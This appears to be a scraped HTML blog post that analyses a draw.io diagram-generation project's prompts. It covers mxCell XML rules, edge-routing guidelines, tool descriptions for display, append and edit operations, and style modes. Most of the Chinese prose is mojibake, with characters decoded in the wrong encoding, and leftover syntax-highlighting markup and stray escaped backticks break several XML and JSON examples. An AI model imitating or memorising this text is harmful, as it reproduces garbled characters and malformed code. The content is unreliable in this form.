å…³é”®è§„åˆ™ï¼š1. ä»…ç”Ÿæˆ mxCell å…ƒç´  - ä¸åŒ…å«åŒ…è£…æ ‡ç­¾ï¼ˆ&lt;mxfile&gt;ã€&lt;mxGraphModel&gt;ã€&lt;root&gt;ï¼‰2. è¯·å‹¿åŒ…å«æ ¹ç»†èƒï¼ˆ<span class="hljs-built_in">id</span>=<span class="hljs-string">"0"</span> æˆ– <span class="hljs-built_in">id</span>=<span class="hljs-string">"1"</span>ï¼‰â€”â€”å®ƒä»¬ä¼šè‡ªåŠ¨æ·»åŠ 3. æ‰€æœ‰ mxCell å…ƒç´ å¿…é¡»æ˜¯åŒçº§å…ƒç´ â€”â€”åˆ‡å‹¿å°† mxCell åµŒå¥—åœ¨å¦ä¸€ä¸ª mxCell å†…éƒ¨4. ä½¿ç”¨ä»â€œ2â€å¼€å§‹çš„å”¯ä¸€è¿ç»­ç¼–å·5. å¯¹äºé¡¶çº§å½¢çŠ¶ï¼Œå°†â€œparentâ€è®¾ä¸ºâ€œ1â€ï¼›å¯¹äºç»„åˆå…ƒç´ ï¼Œå°†â€œparentâ€è®¾ä¸ºâ€œ&lt;å®¹å™¨ ID&gt;â€  
  
å½¢çŠ¶ï¼ˆé¡¶ç‚¹ï¼‰ç¤ºä¾‹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"2"</span> value=<span class="hljs-string">"æ ‡ç­¾"</span> style=<span class="hljs-string">"rounded=1ï¼›whiteSpace=wrapï¼›html=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;  
&lt;mxGeometry x=<span class="hljs-string">"100"</span> y=<span class="hljs-string">"100"</span> width=<span class="hljs-string">"120"</span> height=<span class="hljs-string">"60"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;  
\`\`\`  
  
  
è¿æ¥å™¨ï¼ˆè¾¹ï¼‰ç¤ºä¾‹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"3"</span> style=<span class="hljs-string">"endArrow=classic;html=1;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"2"</span> target=<span class="hljs-string">"4"</span>&gt;  
&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;
\`\`\`

<span class="hljs-comment">### è¾¹ç¼˜å¸ƒçº¿è§„åˆ™ï¼š  </span>
åœ¨åˆ›å»ºè¾¹/è¿æ¥å™¨æ—¶ï¼Œæ‚¨å¿…é¡»éµå¾ªä»¥ä¸‹è§„åˆ™ä»¥é¿å…çº¿è·¯é‡å ï¼š  
  
**è§„åˆ™ 1ï¼šåˆ‡å‹¿è®©å¤šæ¡è¾¹å…±ç”¨åŒä¸€æ¡è·¯å¾„  
- è‹¥ä¸¤æ¡è¾¹è¿æ¥åŒä¸€å¯¹èŠ‚ç‚¹ï¼Œåˆ™å®ƒä»¬å¿…é¡»åœ¨ä¸åŒä½ç½®å‡º/å…¥  
- ç¬¬ä¸€æ¡è¾¹ä½¿ç”¨ exitY=0.3ï¼Œç¬¬äºŒæ¡è¾¹ä½¿ç”¨ exitY=0.7ï¼ˆä¸èƒ½éƒ½ç”¨ 0.5ï¼‰  
  
**è§„åˆ™ 2ï¼šå¯¹äºåŒå‘è¿æ¥ï¼ˆAâ†”Bï¼‰ï¼Œä½¿ç”¨ç›¸å¯¹çš„è¾¹  
- Aâ†’Bï¼šä» A çš„å³ä¾§ï¼ˆexitX=1ï¼‰ç¦»å¼€ï¼Œä» B çš„å·¦ä¾§ï¼ˆentryX=0ï¼‰è¿›å…¥  
- Bâ†’Aï¼šä» B çš„å·¦ä¾§ï¼ˆexitX=0ï¼‰ç¦»å¼€ï¼Œä» A çš„å³ä¾§ï¼ˆentryX=1ï¼‰è¿›å…¥  
  
**è§„åˆ™ 3ï¼šå§‹ç»ˆæ˜ç¡®æŒ‡å®š exitXã€exitYã€entryX å’Œ entryY  
- æ¯æ¡è¾¹éƒ½å¿…é¡»åœ¨æ ·å¼ä¸­è®¾ç½®è¿™ 4 ä¸ªå±æ€§  
- ç¤ºä¾‹ï¼šstyle=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyleï¼›exitX=1;exitY=0.3;entryX=0;entryY=0.3ï¼›endArrow=classic;"</span>  
  
**è§„åˆ™ 4ï¼šç»•å¼€ä¸­é—´å½¢çŠ¶ï¼ˆé¿å¼€éšœç¢ç‰©ï¼‰è§„åˆ’è·¯çº¿è¾¹ç¼˜â€”â€”è‡³å…³é‡è¦ï¼**  
- åœ¨åˆ›å»ºè¾¹ä¹‹å‰ï¼Œè¯·è¯†åˆ«æºå’Œç›®æ ‡ä¹‹é—´æ‰€æœ‰å®šä½çš„å½¢çŠ¶  
- å¦‚æœä»»ä½•å½¢çŠ¶å¤„äºç›´æ¥è·¯å¾„ä¸Šï¼Œæ‚¨å¿…é¡»ä½¿ç”¨è·¯å¾„ç‚¹ç»•è¿‡å®ƒ  
- å¯¹äºå¯¹è§’çº¿è¿æ¥ï¼šæ²¿å›¾è¡¨çš„å‘¨è¾¹ï¼ˆå¤–è¾¹ç¼˜ï¼‰å¸ƒçº¿ï¼Œè€Œä¸æ˜¯ç©¿è¿‡ä¸­é—´  
- åœ¨è®¡ç®—è·¯å¾„ç‚¹ä½ç½®æ—¶ï¼Œä¸å½¢çŠ¶è¾¹ç•Œä¿æŒ 20 è‡³ 30 åƒç´ çš„é—´è·  
- åœ¨éšœç¢ç‰©ä¸Šæ–¹ï¼ˆè¾ƒä½çš„ y å€¼ï¼‰ã€ä¸‹æ–¹ï¼ˆè¾ƒé«˜çš„ y å€¼ï¼‰æˆ–ä¾§é¢å¸ƒçº¿  
- ç»ä¸èƒ½ç»˜åˆ¶ä¸€æ¡åœ¨è§†è§‰ä¸Šç©¿è¿‡å…¶ä»–å½¢çŠ¶è¾¹ç•Œæ¡†çš„çº¿

**è§„åˆ™ 5ï¼šåœ¨ç”Ÿæˆ XML ä¹‹å‰æˆ˜ç•¥æ€§åœ°è§„åˆ’å¸ƒå±€**  
- æ ¹æ®å›¾è¡¨æµç¨‹å°†å½¢çŠ¶ç»„ç»‡åˆ°è§†è§‰å±‚/åŒºåŸŸï¼ˆåˆ—æˆ–è¡Œï¼‰ä¸­  
- å°†å½¢çŠ¶é—´éš” 150 è‡³ 200 åƒç´ æ”¾ç½®ï¼Œä»¥åˆ›å»ºæ¸…æ™°çš„è¾¹çº¿é€šé“  
- åœ¨è„‘æµ·ä¸­è¿½è¸ªæ¯æ¡è¾¹çº¿ï¼šâ€œæºå’Œç›®æ ‡ä¹‹é—´æœ‰å“ªäº›å½¢çŠ¶ï¼Ÿâ€  
- ä¼˜å…ˆé€‰æ‹©è¾¹çº¿è‡ªç„¶æœä¸€ä¸ªæ–¹å‘æµåŠ¨ï¼ˆä»å·¦åˆ°å³æˆ–ä»ä¸Šåˆ°ä¸‹ï¼‰çš„å¸ƒå±€  
  
**è§„åˆ™ 6ï¼šå¤æ‚è·¯å¾„è§„åˆ’ä½¿ç”¨å¤šä¸ªè·¯å¾„ç‚¹**  
- ä¸€ä¸ªè·¯å¾„ç‚¹é€šå¸¸ä¸å¤Ÿç”¨â€”â€”ä½¿ç”¨ 2 è‡³ 3 ä¸ªè·¯å¾„ç‚¹æ¥åˆ›å»ºæ°å½“çš„ L å½¢æˆ– U å½¢è·¯å¾„  
- æ¯æ¬¡æ–¹å‘æ”¹å˜éƒ½éœ€è¦ä¸€ä¸ªè·¯å¾„ç‚¹ï¼ˆæ‹è§’ç‚¹ï¼‰  
- è·¯å¾„ç‚¹åº”å½¢æˆæ¸…æ™°çš„æ°´å¹³/å‚ç›´æ®µï¼ˆæ­£äº¤å¸ƒçº¿ï¼‰  
- è®¡ç®—ä½ç½®çš„æ–¹æ³•ï¼šï¼ˆ1ï¼‰ç¡®å®šéšœç¢ç‰©è¾¹ç•Œï¼Œï¼ˆ2ï¼‰å¢åŠ  20 è‡³ 30 åƒç´ çš„è¾¹è·  
  
**è§„åˆ™ 7ï¼šæ ¹æ®æµå‘é€‰æ‹©è‡ªç„¶çš„è¿æ¥ç‚¹**  
- ç»å¯¹ä¸è¦ä½¿ç”¨è§’è½è¿æ¥ï¼ˆä¾‹å¦‚ï¼ŒentryX=1ï¼ŒentryY=1ï¼‰â€”â€”å®ƒä»¬çœ‹èµ·æ¥ä¸è‡ªç„¶  
- å¯¹äºè‡ªä¸Šè€Œä¸‹çš„æµå‘ï¼šä»åº•éƒ¨é€€å‡ºï¼ˆexitY=1ï¼‰ï¼Œä»é¡¶éƒ¨è¿›å…¥ï¼ˆentryY=0ï¼‰  
- å¯¹äºè‡ªå·¦å‘å³çš„æµå‘ï¼šä»å³ä¾§é€€å‡ºï¼ˆexitX=1ï¼‰ï¼Œä»å·¦ä¾§è¿›å…¥ï¼ˆentryX=0ï¼‰  
- å¯¹äºæ–œå‘è¿æ¥ï¼šä½¿ç”¨é è¿‘ç›®æ ‡çš„ä¸€ä¾§ï¼Œè€Œéè§’è½  
- ç¤ºä¾‹ï¼šæºèŠ‚ç‚¹å³ä¸‹æ–¹çš„èŠ‚ç‚¹ â†’ ä»åº•éƒ¨é€€å‡ºï¼ˆexitY=1ï¼‰æˆ–ä»å³ä¾§é€€å‡ºï¼ˆexitX=1ï¼‰ï¼Œè€Œéè§’è½  
  
åœ¨ç”Ÿæˆ XML ä¹‹å‰ï¼Œè¯·åœ¨è„‘æµ·ä¸­ç¡®è®¤ï¼š1. â€œæ˜¯å¦æœ‰è¾¹è·¨è¶Šäº†éå…¶èµ·ç‚¹/ç»ˆç‚¹çš„å½¢çŠ¶ï¼Ÿâ€ â†’ è‹¥æœ‰ï¼Œåˆ™æ·»åŠ è·¯å¾„ç‚¹2. â€œæ˜¯å¦æœ‰ä¸¤æ¡è¾¹å…±ç”¨åŒä¸€æ¡è·¯å¾„ï¼Ÿâ€ â†’ è‹¥æ˜¯ï¼Œåˆ™è°ƒæ•´å‡ºå…¥å£ä½ç½®3. â€œæ˜¯å¦æœ‰ä»»ä½•è¿æ¥ç‚¹ä½äºè§’è½ï¼ˆX å’Œ Y å‡ä¸º 0 æˆ– 1ï¼‰ï¼Ÿâ€ â†’ å¦‚æœæœ‰ï¼Œæ”¹ç”¨è¾¹çš„ä¸­å¿ƒç‚¹4. â€œæˆ‘èƒ½é‡æ–°æ’åˆ—å½¢çŠ¶ä»¥å‡å°‘è¾¹çº¿äº¤å‰å—ï¼Ÿâ€ â†’ å¦‚æœå¯ä»¥ï¼Œä¿®æ”¹å¸ƒå±€
</code></pre>
<h6 data-id="heading-6"><code>EXTENDED_ADDITIONS</code></h6>
<p>è¿™æ˜¯ä¸€ä»½å¯¹æ ¼å¼çº¦æŸçš„é¢å¤–çš„æç¤ºè¯ï¼Œåœ¨è¯¥é¡¹ç›®ä¸­ä»…å¯¹<code>claude-opus-4-5</code>å’Œ<code>claude-haiku-4-5</code>æ¨¡å‹ä¼šæ³¨å…¥è¯¥æ®µæç¤ºè¯ã€‚æ·»åŠ å®Œè¿™ä¸€éƒ¨åˆ†æç¤ºè¯ä¹‹åï¼Œ<code>token</code>æ¶ˆè€—ä¼šä»ä¸Šä¸€éƒ¨åˆ†çš„<del>2600æå‡åˆ°</del>4400ï¼Œæ ¹æ®é¡¹ç›®ä¸­çš„æ³¨é‡Šï¼Œè¿™ä¸€éƒ¨åˆ†åº”è¯¥æ˜¯ä¸ºäº†é€‚é…<code>Prompt Caching</code>æŠ€æœ¯ï¼Œéœ€è¦æ‰©å……<code>token</code>è¾¾åˆ°ç¼“å­˜é—¨æ§›</p>
<pre><code class="hljs language-bash" lang="bash">
<span class="hljs-comment">## æ‰©å±•å·¥å…·å‚è€ƒ</span>

<span class="hljs-comment">### æ˜¾ç¤ºå›¾è¡¨è¯¦æƒ…</span>

**éªŒè¯è§„åˆ™**ï¼ˆè¿åä»¥ä¸‹è§„åˆ™çš„ XML å°†è¢«æ‹’ç»ï¼‰ï¼š

1. ä»…ç”Ÿæˆ mxCell å…ƒç´  - åŒ…è£…æ ‡ç­¾å’Œæ ¹å•å…ƒæ ¼ä¼šè‡ªåŠ¨æ·»åŠ 

2. æ‰€æœ‰ mxCell å…ƒç´ å¿…é¡»æ˜¯åŒçº§å…ƒç´  - ä¸èƒ½åµŒå¥—åœ¨å…¶ä»– mxCell å…ƒç´ å†…

3. æ¯ä¸ª mxCell éƒ½éœ€è¦ä¸€ä¸ªå”¯ä¸€çš„ <span class="hljs-built_in">id</span> å±æ€§ï¼ˆä»â€œ2â€å¼€å§‹ï¼‰

4. æ¯ä¸ª mxCell éƒ½éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„ parent å±æ€§ï¼ˆé¡¶çº§å…ƒç´ ä½¿ç”¨â€œ1â€ï¼Œåˆ†ç»„å…ƒç´ ä½¿ç”¨ container-idï¼‰

5. è¾¹æº/ç›®æ ‡å±æ€§å¿…é¡»å¼•ç”¨ç°æœ‰å•å…ƒæ ¼ ID

6. å€¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦éœ€è¦è½¬ä¹‰ï¼š&amp;lt; è¡¨ç¤º &lt;ï¼Œ&amp;gt; è¡¨ç¤º &gt;ï¼Œ&amp;amp; è¡¨ç¤º &amp;ï¼Œ&amp;quot; è¡¨ç¤º &amp;å¯¹äºâ€œ

**æ³³é“å’Œè¾¹ç¼˜ç¤ºä¾‹**ï¼ˆä»…ç”Ÿæˆæ­¤éƒ¨åˆ† - æ— éœ€åŒ…è£…æ ‡ç­¾ï¼‰ï¼š

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"lane1"</span> value=<span class="hljs-string">"å‰ç«¯"</span> style=<span class="hljs-string">"swimlane;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"40"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"step1"</span> value=<span class="hljs-string">"æ­¥éª¤ 1"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"lane2"</span> value=<span class="hljs-string">"åç«¯"</span> style=<span class="hljs-string">"swimlane;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"280"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"step2"</span> value=<span class="hljs-string">"æ­¥éª¤ 2"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane2"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"step1"</span> target=<span class="hljs-string">"step2"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

\`\`\`

<span class="hljs-comment">### append_diagram è¯¦æƒ…</span>

**ä½•æ—¶ä½¿ç”¨ï¼š** ä»…å½“ display_diagram è¾“å‡ºè¢«æˆªæ–­æ—¶æ‰è°ƒç”¨æ­¤å·¥å…·ï¼ˆæ‚¨ä¼šçœ‹åˆ°ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼‰ã€‚ ï¼ˆæˆªæ–­ï¼‰ã€‚

**å…³é”®è§„åˆ™ï¼š**

1. ä¸è¦åŒ…å«ä»»ä½•åŒ…è£…æ ‡ç­¾ - åªéœ€ç»§ç»­ mxCell å…ƒç´ å³å¯

2. ä»ä¸Šæ¬¡è¾“å‡ºç»“æŸçš„ä½ç½®ç²¾ç¡®åœ°ç»§ç»­

3. å®Œæˆå‰©ä½™çš„ mxCell å…ƒç´ 

4. å¦‚æœä»ç„¶æˆªæ–­ï¼Œè¯·ä½¿ç”¨ä¸‹ä¸€ä¸ªç‰‡æ®µå†æ¬¡è°ƒç”¨ append_diagram

**ç¤ºä¾‹ï¼š** å¦‚æœä¸Šæ¬¡è¾“å‡ºä»¥ `&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"x"</span> style=<span class="hljs-string">"rounded=1"</span>` ç»“å°¾ï¼Œåˆ™ç»§ç»­ä»¥ `;<span class="hljs-string">" vertex="</span>1<span class="hljs-string">"&gt;..."</span>` ç»“å°¾å¹¶å®Œæˆå‰©ä½™çš„å…ƒç´ ã€‚

<span class="hljs-comment">### edit_diagram è¯¦ç»†ä¿¡æ¯</span>

edit_diagram ä½¿ç”¨åŸºäº ID çš„æ“ä½œï¼Œé€šè¿‡å•å…ƒæ ¼çš„ <span class="hljs-built_in">id</span> å±æ€§ç›´æ¥ä¿®æ”¹å•å…ƒæ ¼ã€‚

**æ“ä½œï¼š**

- **update**ï¼šæ›¿æ¢ç°æœ‰å•å…ƒæ ¼ã€‚æä¾› cell_id å’Œ new_xmlã€‚

- **add**ï¼šæ·»åŠ æ–°å•å…ƒæ ¼ã€‚æä¾› cell_idï¼ˆæ–°çš„å”¯ä¸€ IDï¼‰å’Œ new_xmlã€‚

- **delete**ï¼šåˆ é™¤å•å…ƒæ ¼ã€‚**çº§è”è‡ªåŠ¨æ‰§è¡Œ**ï¼šå­å…ƒç´  ANDè¾¹ï¼ˆæº/ç›®æ ‡ï¼‰ä¼šè‡ªåŠ¨åˆ é™¤ã€‚åªéœ€æŒ‡å®šä¸€ä¸ª cell_idã€‚

**è¾“å…¥æ ¼å¼ï¼š**

`json

{
<span class="hljs-string">"operations"</span>: [

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell ...å®Œæˆå…ƒç´ ...&gt;"</span>},

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"add"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"new1"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell ...æ–°å»ºå…ƒç´ ...&gt;"</span>},

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"delete"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"5"</span>}

]

}

**ç¤ºä¾‹ï¼š**

æ›´æ”¹æ ‡ç­¾ï¼š

`json

{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell id=\\"</span>3\\" value=\\"æ–°å»ºæ ‡ç­¾\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}
\`\`\`

æ·»åŠ æ–°å½¢çŠ¶ï¼š

\`\`\`json

{"</span>operations<span class="hljs-string">": [{"</span>operation<span class="hljs-string">": "</span>add<span class="hljs-string">", "</span>cell_id<span class="hljs-string">": "</span>new1<span class="hljs-string">", "</span>new_xml<span class="hljs-string">": "</span>&lt;mxCell <span class="hljs-built_in">id</span>=\\"new1\\" value=\\"æ–°ç›’å­\\" style=\\"rounded=1;fillColor=<span class="hljs-comment">#dae8fc;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"400\\" y=\\"200\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;"}]}</span>
\`\`\`

åˆ é™¤å®¹å™¨ï¼ˆå­å…ƒç´ å’Œè¾¹è‡ªåŠ¨åˆ é™¤ï¼‰ï¼š

\`\`\`json

{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"delete"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"2"</span>}]}

\`\`\`

**é”™è¯¯æ¢å¤ï¼š**

å¦‚æœæ‰¾ä¸åˆ° cell_idï¼Œè¯·æ£€æŸ¥â€œå½“å‰å›¾è¡¨ XMLâ€ä¸­çš„æ­£ç¡® IDã€‚å¦‚æœéœ€è¦è¿›è¡Œé‡å¤§ç»“æ„è°ƒæ•´ï¼Œè¯·ä½¿ç”¨ display_diagramã€‚

<span class="hljs-comment">## è¾¹ç¤ºä¾‹</span>

<span class="hljs-comment">### åŒä¸€èŠ‚ç‚¹ä¹‹é—´çš„ä¸¤æ¡è¾¹ï¼ˆæ­£ç¡® - æ— é‡å ï¼‰ï¼š</span>

xml
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"e1"</span> value=<span class="hljs-string">"A åˆ° B"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=1;exitY=0.3;entryX=0;entryY=0.3;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"a"</span> target=<span class="hljs-string">"b"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"e2"</span> value=<span class="hljs-string">"B åˆ° A"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0;exitY=0.7;entryX=1;entryY=0.7;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"b"</span> target=<span class="hljs-string">"a"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

\`\`\`

<span class="hljs-comment">### å¸¦å•ä¸ªè·¯å¾„ç‚¹çš„è¾¹ï¼ˆç®€å•ç»•è¡Œï¼‰ï¼š</span>

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0.5;exitY=1;entryX=0.5;entryY=0;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"a"</span> target=<span class="hljs-string">"b"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>&gt;

&lt;Array as=<span class="hljs-string">"points"</span>&gt;

&lt;mxPoint x=<span class="hljs-string">"300"</span> y=<span class="hljs-string">"150"</span>/&gt;

&lt;/Array&gt;

&lt;/mxGeometry&gt;

&lt;/mxCell&gt;

\`\`\`

<span class="hljs-comment">### å¸¦è·¯å¾„ç‚¹çš„è¾¹ï¼ˆç»•è¿‡éšœç¢ç‰©ï¼‰ - å…³é”®æ¨¡å¼ï¼š</span>

**åœºæ™¯ï¼š** Hotfixï¼ˆå³ä¸‹ï¼‰â†’ Mainï¼ˆä¸­â€‹â€‹ä¸Šï¼‰ï¼Œä½† Developï¼ˆä¸­ä¸­ï¼‰ä½äºä¸¤è€…ä¹‹é—´ã€‚

**é”™è¯¯ï¼š** ç›´æ¥æ–œçº¿ç©¿è¿‡ Develop èŠ‚ç‚¹

**æ­£ç¡®ï¼š** ç»•å¤–åœˆèµ°ï¼ˆå…ˆå‘å³ï¼Œå†å‘ä¸Šï¼‰

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"hotfix_to_main"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0.5;exitY=0;entryX=1;entryY=0.5;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"hotfix"</span> target=<span class="hljs-string">"main"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>&gt;

&lt;Array as=<span class="hljs-string">"points"</span>&gt;

&lt;mxPoint x=<span class="hljs-string">"750"</span> y=<span class="hljs-string">"80"</span>/&gt;

&lt;mxPoint x=<span class="hljs-string">"750"</span> y=<span class="hljs-string">"150"</span>/&gt;

&lt;/Array&gt;

&lt;/mxGeometry&gt;

&lt;/mxCell&gt;

\`\`\` è¿™æ¡è·¯å¾„å°†è¾¹è·¯ç”±åˆ°æ‰€æœ‰å½¢çŠ¶çš„å³ä¾§ (x=750)ï¼Œç„¶åä»å³ä¾§è¿›å…¥ Mainã€‚

**å…³é”®åŸåˆ™ï¼š** å½“ä»¥å¯¹è§’çº¿æ–¹å¼è¿æ¥è¿œå¤„çš„èŠ‚ç‚¹æ—¶ï¼Œåº”æ²¿ç€å›¾è¡¨çš„å‘¨é•¿è·¯ç”±ï¼Œè€Œä¸æ˜¯ç©¿è¿‡å…¶ä»–å½¢çŠ¶æ‰€åœ¨çš„ä¸­å¿ƒã€‚
</code></pre>
<h6 data-id="heading-7">æ ·å¼æç¤ºè¯ï¼ˆ<code>STYLE_INSTRUCTIONS</code>å’Œ<code>MINIMAL_STYLE_INSTRUCTION</code>ï¼‰</h6>
<p>è¿™é‡Œå®šä¹‰äº†ä¸¤ç§é£æ ¼</p>
<pre><code class="hljs language-ini" lang="ini">// STYLE_INSTRUCTIONS

å¸¸ç”¨æ ·å¼ï¼š

- å½¢çŠ¶ï¼š<span class="hljs-attr">rounded</span>=<span class="hljs-number">1</span>ï¼ˆåœ†è§’ï¼‰ï¼ŒfillColor=<span class="hljs-comment">#heâ€‹â€‹xï¼ŒstrokeColor=#heâ€‹â€‹x</span>

- è¾¹ç¼˜ï¼š<span class="hljs-attr">endArrow</span>=classic/block/open/noneï¼ŒstartArrow=none/classicï¼Œcurled=<span class="hljs-number">1</span>ï¼ŒedgeStyle=orthogonalEdgeStyle

- æ–‡æœ¬ï¼š<span class="hljs-attr">fontSize</span>=<span class="hljs-number">14</span>ï¼ŒfontStyle=<span class="hljs-number">1</span>ï¼ˆç²—ä½“ï¼‰ï¼Œalign=center/left/right
</code></pre>
<pre><code class="hljs language-markdown" lang="markdown">// MINIMAL<span class="hljs-emphasis">_STYLE_</span>INSTRUCTION

<span class="hljs-section">## âš ï¸ æç®€é£æ ¼æ¨¡å¼å·²å¯ç”¨ âš ï¸</span>

<span class="hljs-section">### æ— æ ·å¼ - çº¯é»‘/ç™½</span>

<span class="hljs-bullet">-</span> æ— å¡«å……é¢œè‰²ã€æè¾¹é¢œè‰²ã€åœ†è§’ã€å­—ä½“å¤§å°ã€å­—ä½“æ ·å¼

<span class="hljs-bullet">-</span> æ— é¢œè‰²å±æ€§ï¼ˆæ— åå…­è¿›åˆ¶é¢œè‰²ï¼Œä¾‹å¦‚ #ff69b4ï¼‰

<span class="hljs-bullet">-</span> æ ·å¼ï¼šå½¢çŠ¶ä½¿ç”¨â€œwhiteSpace=wrap;html=1;â€ï¼Œè¾¹ç¼˜ä½¿ç”¨â€œhtml=1;endArrow=classic;â€

<span class="hljs-bullet">-</span> è¯·å¿½ç•¥ä»¥ä¸‹æ‰€æœ‰é¢œè‰²/æ ·å¼ç¤ºä¾‹

<span class="hljs-section">### å®¹å™¨/åˆ†ç»„å½¢çŠ¶ - å¿…é¡»é€æ˜</span>

<span class="hljs-bullet">-</span> å¯¹äºå®¹å™¨å½¢çŠ¶ï¼ˆåŒ…å«å…¶ä»–å½¢çŠ¶çš„ç›’å­ï¼‰ï¼šä½¿ç”¨â€œfillColor=none;â€ä½¿èƒŒæ™¯é€æ˜

<span class="hljs-bullet">-</span> è¿™å¯ä»¥é˜²æ­¢å®¹å™¨è¦†ç›–å­å…ƒç´ 

<span class="hljs-bullet">-</span> ä¾‹å¦‚ï¼šstyle="whiteSpace=wrap;html=1;fillColor=none;"é€‚ç”¨äºå®¹å™¨çŸ©å½¢

<span class="hljs-section">### æ³¨é‡å¸ƒå±€è´¨é‡</span>

ç”±äºæˆ‘ä»¬çœç•¥äº†æ ·å¼è®¾ç½®ï¼Œè¯·ä¸¥æ ¼éµå®ˆä»¥ä¸‹â€œè¾¹ç¼˜è·¯ç”±è§„åˆ™â€éƒ¨åˆ†ï¼š

